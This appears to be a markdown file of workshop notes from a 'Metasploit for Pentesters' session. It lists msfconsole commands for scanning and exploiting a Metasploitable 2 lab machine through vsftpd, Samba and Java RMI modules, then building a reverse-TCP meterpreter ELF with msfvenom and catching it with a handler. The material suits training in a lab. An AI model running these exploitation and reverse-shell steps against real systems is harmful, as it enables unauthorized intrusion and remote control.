@@ -1,0 +1,116 @@
+This file contains the commands showcased during the Null Humla session on "Metasploit for Pentesters" conducted on 27th May in Bhopal. Expecting contributions and improvements.
+
+> ... means that fill it with your own sense of logic
+
+
+service postgresql start
+msfconsole
+
+---
+
+db_nmap -sn 192.168.1.1/24 -vv
+hosts
+db_nmap -A 192.168.1.101 -vv
+services
+
+---
+
+> Let's assume metasploitable 2 IP to be 192.168.1.101
+
+workspace -a portscan
+workspace portscan
+
+search portscan
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.101
+set THREADS 20
+run
+
+search name:auxiliary ftp
+grep ftp_version name:auxiliary ftp
+use auxiliary/scanner/ftp/ftp_version
+set...
+run...
+
+search name:auxiliary ssh
+use auxiliary/scanner/ssh/ssh_version
+setg...
+run
+
+search name:auxiliary telnet
+use auxiliary/scanner/telnet/telnet_version
+run
+
+> Google search port numbers - Find service running on that port - find auxiliary model for identifying version
+> If you can't find the service running on port, after some time it doesn't hurt to see nmap's finding
+
+> same data
+> port  21  vsftpd v 2.3.4
+
+search vsftpd name:exploit
+use ...
+set ...
+run
+
+---
+
+google search samba 3.x exploit
+use exploit/multi/samba/usermap_script
+show payloads
+set payload ...
+set <options>
+run
+
+> Repeat the same for other detected versions
+
+---
+
+search name:exploit java rmi
+use exploit/multi/misc/java_rmi_server
+set payload java/meterpreter/reverse_tcp
+set options
+run
+
+> This will create a background session. *Java's version of meterpreter has less libraries*
+
+sessions 
+
+> Will show a list of sessions
+
+sessions -i <id>
+
+> use the meterpreter session 
+
+sysinfo
+getuid
+shell
+
+> In another tab: Tab2
+
+msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=443 -f elf > evil 
+
+> Type below in Tab1's meterpreter session
+
+upload evil
+
+> Start another msfconsole session in Tab2 and type below
+
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST <kali ip>
+set LPORT 443
+run
+
+> Back to Tab1
+
+shell 
+./evil
+
+> This will give you a proper meterpreter
+
+
+Resources:
+- [Vulnhub](https://www.vulnhub.com/)
+- [HacktheBox](https://www.hackthebox.eu/)
+- [Pentesters Lab](https://www.pentesterlab.com/)
+- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
